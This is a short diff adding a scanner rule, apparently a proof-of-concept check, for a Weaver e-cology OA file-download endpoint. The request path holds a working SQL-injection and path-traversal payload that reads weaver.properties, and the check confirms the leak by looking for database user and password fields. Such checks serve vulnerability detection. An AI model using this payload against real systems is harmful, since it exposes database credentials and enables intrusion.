@@ -1,0 +1,8 @@
+name: weaver-ecology-oa-e-weaver-signature-download
+rules:
+  - method: GET
+    path: "/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'ecology.user=') && response.body.bcontains(b'ecology.password=')
+detail:
+  author: 666
